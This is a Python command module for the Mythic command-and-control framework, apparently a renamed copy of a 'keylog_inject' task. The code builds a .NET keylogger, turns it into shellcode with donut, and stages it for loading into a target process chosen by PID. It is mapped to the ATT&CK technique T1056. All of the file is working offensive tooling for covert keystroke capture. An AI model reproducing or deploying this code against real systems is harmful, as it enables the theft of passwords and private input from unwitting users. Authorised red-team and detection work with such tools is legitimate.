from distutils.dir_util import copy_tree
import os
import shutil
import tempfile
from mythic_container.MythicCommandBase import *
import json
from uuid import uuid4
from os import path
from mythic_container.MythicRPC import *
import base64
import os
import asyncio
import donut

KEYLOG_topp_PATH = "/srv/KeyLogtopp.exe"

class KeylogtoppArguments(TaskArguments):

    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="pid",
                cli_name="PID",
                display_name="PID",
                type=ParameterType.Number,
                description="Process ID to topp keylogger into."),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            raise Exception("Invalid number of parameters passed.\n\tUsage: {}".format(KeylogtoppCommand.help_cmd))
        if self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("pid", self.command_line.strip(), ParameterType.Number)
        self.add_arg("pipe_name", str(uuid4()))


class KeylogtoppCommand(CommandBase):
    cmd = "keylog_topp"
    needs_admin = False
    help_cmd = "keylog_topp [pid]"
    description = "Start a keylogger in a remote process."
    version = 2
    author = "@djhohnstein"
    argument_class = KeylogtoppArguments
    browser_script = BrowserScript(script_name="keylog_topp", author="@its_a_feature_", for_new_ui=True)
    attackmapping = ["T1056"]
    supported_ui_features=["keylog_topp"]

    async def build_keylogtopp(self):
        global KEYLOG_topp_PATH
        agent_build_path = tempfile.TemporaryDirectory()            
        outputPath = "{}/Keylogtopp/bin/Release/Keylogtopp.exe".format(agent_build_path.name)
            # shutil to copy payload files over
        copy_tree(str(self.agent_code_path), agent_build_path.name)
        shell_cmd = "dotnet build -c release -p:DebugType=None -p:DebugSymbols=false -p:Platform=x64 {}/Keylogtopp/Keylogtopp.csproj -o {}/Keylogtopp/bin/Release/".format(agent_build_path.name, agent_build_path.name)
        proc = await asyncio.create_subprocess_shell(shell_cmd, stdout=asyncio.subprocess.PIPE,
                                                         stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
        stdout, stderr = await proc.communicate()
        if not path.exists(outputPath):
            raise Exception("Failed to build Keylogtopp.exe:\n{}".format(stderr.decode() + "\n" + stdout.decode()))
        shutil.copy(outputPath, KEYLOG_topp_PATH)


    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        global KEYLOG_topp_PATH
        if not path.exists(KEYLOG_topp_PATH):
            await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
                TaskID=taskData.Task.ID,
                UpdateStatus=f"building topping stub"
            ))
            await self.build_keylogtopp()
        await SendMythicRPCTaskUpdate(MythicRPCTaskUpdateMessage(
            TaskID=taskData.Task.ID,
            UpdateStatus=f"generating stub shellcode"
        ))

        donutPic = donut.create(
            file=KEYLOG_topp_PATH, params=taskData.args.get_arg("pipe_name")
        )
        file_resp = await SendMythicRPCFileCreate(
            MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID, FileContents=donutPic, DeleteAfterFetch=True
            )
        )
        if file_resp.Success:
            taskData.args.add_arg("loader_stub_id", file_resp.AgentFileId)
        else:
            raise Exception(
                "Failed to register keylog_topp stub binary: " + file_resp.Error
            )
        response.DisplayParams = "-PID {}".format(taskData.args.get_arg("pid"))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
